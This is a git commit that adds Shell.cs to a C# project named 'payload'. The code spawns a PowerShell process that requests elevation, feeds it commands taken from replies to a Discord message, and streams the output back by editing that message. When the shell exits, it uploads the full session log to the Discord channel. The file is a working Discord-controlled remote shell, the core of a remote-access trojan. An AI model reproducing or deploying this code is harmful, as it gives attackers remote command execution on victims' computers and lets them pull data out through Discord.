ea89019f30fe5ae0e4cf21b29dc7956a8c8e055f
chash <70506265+cchash@users.noreply.github.com>
2022-04-13 17:07:17 +0800

    Add files via upload

---
+++ payload/Shell.cs
@@ -0,0 +1,87 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Text;
+using System.Threading;
+
+using Discord;
+using Discord.Rest;
+
+namespace payload
+{
+    public class Shell
+    {
+        public RestUserMessage shmessage { get; set; }
+
+        public Process shproc { get; set; }
+
+        private List<string> log = new List<string>();
+        private Thread uThread;
+        public Shell(RestUserMessage srcmsg)
+        {
+            shmessage = srcmsg;
+            uThread = new Thread(() =>
+            {
+                while (true)
+                {
+                    if (log.Count > 0)
+                    {
+                        string text = string.Join("\n", log);
+                        List<string> lines = new List<string>(text.Split('\n'));
+                        while (lines.Count > 20) lines.RemoveAt(0);
+                        string content = string.Join("\n", lines);
+                        if (shmessage.Content != content)
+                        {
+                            shmessage.ModifyAsync((m) => { m.Content = "Reply to this message to input commands.\n```" + string.Join("\n", lines) + "```"; }).GetAwaiter().GetResult();
+                        }
+                    }
+                    Thread.Sleep(500);
+                }
+            });
+        }
+
+        public void Start()
+        {
+            shproc = new Process
+            {
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "powershell.exe",
+                    UseShellExecute = false,
+                    RedirectStandardInput = true,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    Verb = "runas"
+                }
+            };
+            shproc.EnableRaisingEvents = true;
+            shproc.OutputDataReceived += OutputHandler;
+            shproc.ErrorDataReceived += OutputHandler;
+            shproc.Exited += ExitHandler;
+            shproc.Start();
+            shproc.BeginOutputReadLine();
+            shproc.BeginErrorReadLine();
+            uThread.Start();
+        }
+
+        public void SendCommand(string cmd)
+        {
+            shproc.StandardInput.WriteLine(cmd);
+        }
+
+        private void ExitHandler(object sender, EventArgs e)
+        {
+            MemoryStream memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(string.Join("\n", log)));
+            shmessage.Channel.SendFileAsync(memoryStream, "log.txt").GetAwaiter().GetResult();
+            memoryStream.Dispose();
+            uThread.Abort();
+            Program.shells.Remove(this);
+        }
+
+        private void OutputHandler(object sender, DataReceivedEventArgs e)
+        {
+            log.Add(e.Data);
+        }
+    }
+}
